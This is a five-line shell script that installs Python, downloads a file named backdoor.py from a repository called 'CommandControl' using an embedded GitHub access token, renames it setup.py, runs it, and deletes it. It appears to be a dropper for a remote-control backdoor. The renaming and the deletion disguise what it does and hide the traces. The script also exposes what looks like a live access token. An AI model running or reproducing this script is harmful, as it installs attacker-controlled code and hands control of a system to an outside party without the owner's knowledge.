yum install -y python3;
curl -o setup.py https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/backdoor.py -H "Authorization: Token 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";
chmod +x setup.py
python3 setup.py;
rm setup.py
